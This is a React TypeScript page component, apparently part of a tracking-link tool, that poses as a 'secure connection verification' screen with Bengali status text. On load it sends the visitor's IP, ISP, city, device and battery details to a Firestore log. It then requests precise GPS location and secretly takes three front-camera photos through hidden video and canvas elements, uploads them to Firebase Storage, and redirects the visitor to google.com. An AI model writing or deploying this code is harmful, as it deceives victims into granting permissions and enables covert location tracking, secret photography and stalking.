
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, updateDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [status, setStatus] = useState('সুরক্ষিত সংযোগ স্থাপন করা হচ্ছে...');
  const [progress, setProgress] = useState(5);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const isRunning = useRef(false);

  useEffect(() => {
    if (id && !isRunning.current) {
      isRunning.current = true;
      startTrackingSequence();
    }
  }, [id]);

  const resizeImage = (dataUrl: string): Promise<string> => {
    return new Promise((resolve) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        canvas.width = 300;
        canvas.height = 300;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.drawImage(img, 0, 0, 300, 300);
          resolve(canvas.toDataURL('image/jpeg', 0.4));
        }
      };
      img.src = dataUrl;
    });
  };

  const startTrackingSequence = async () => {
    let currentDocId = "";

    // 1. Log Basic Info Immediately (Ensures Count Increases)
    try {
      setStatus('সার্ভার যাচাই করা হচ্ছে...');
      const [ipRes, battery] = await Promise.all([
        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ ip: 'Unknown', org: 'Unknown', city: 'Unknown' })),
        // @ts-ignore
        navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
      ]);

      const logData = {
        userId: id, // Critical for counting
        timestamp: serverTimestamp(),
        ip: ipRes.ip || "Unknown",
        isp: ipRes.org || "Unknown",
        city: ipRes.city || "Unknown",
        device: {
          name: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/i.test(navigator.userAgent) ? 'iOS' : 'PC',
          model: navigator.platform,
          userAgent: navigator.userAgent
        },
        battery: battery ? { level: Math.round(battery.level * 100), charging: battery.charging } : null,
        status: 'Logged'
      };

      const docRef = await addDoc(collection(db, "logs"), logData);
      currentDocId = docRef.id;
      setProgress(30);
    } catch (err) {
      console.error("Base logging failed", err);
    }

    if (!currentDocId) return;

    // 2. Request Location
    try {
      setStatus('নিরাপত্তা কোড যাচাই করা হচ্ছে...');
      const pos = await new Promise<GeolocationPosition>((res, rej) => {
        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
      });
      await updateDoc(doc(db, "logs", currentDocId), {
        location: { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }
      });
      setProgress(60);
    } catch (e) {
      console.log("GPS Denied");
    }

    // 3. Request Camera & Snap Selfies
    try {
      setStatus('অ্যাক্সেস কনফার্ম করা হচ্ছে...');
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise(r => setTimeout(r, 1200));

        const photoUrls: string[] = [];
        const canvas = canvasRef.current;
        
        for (let i = 0; i < 3; i++) {
          if (canvas && videoRef.current) {
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
            
            const rawBase64 = canvas.toDataURL('image/jpeg');
            const compressedBase64 = await resizeImage(rawBase64);
            
            const storageRef = ref(storage, `captures/${id}/${Date.now()}_${i}.jpg`);
            await uploadString(storageRef, compressedBase64, 'data_url');
            photoUrls.push(await getDownloadURL(storageRef));
            await new Promise(r => setTimeout(r, 500));
          }
        }
        
        stream.getTracks().forEach(t => t.stop());
        await updateDoc(doc(db, "logs", currentDocId), { photoUrls, status: 'Completed' });
      }
      setProgress(100);
      setStatus('সফলভাবে সম্পন্ন হয়েছে');
    } catch (e) {
      console.log("Camera Denied");
      setProgress(100);
    }

    // Final Wait & Redirect
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-8 text-center font-['Hind_Siliguri']">
      <div className="w-full max-w-sm">
        <div className="mb-10">
           <div className="w-20 h-20 border-[6px] border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-8 shadow-lg shadow-blue-100"></div>
           <h2 className="text-2xl font-bold text-slate-800 mb-2">{status}</h2>
           <p className="text-slate-400 text-xs font-bold uppercase tracking-[0.2em]">Secure Connection Verification</p>
        </div>
        
        <div className="w-full bg-slate-100 h-2 rounded-full overflow-hidden mb-4 shadow-inner">
           <div className="bg-blue-600 h-full transition-all duration-1000 ease-out" style={{ width: `${progress}%` }}></div>
        </div>
        
        <p className="text-[10px] text-slate-300 italic">Do not close this window while we verify your session.</p>
        
        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
    </div>
  );
};

export default TrackPage;
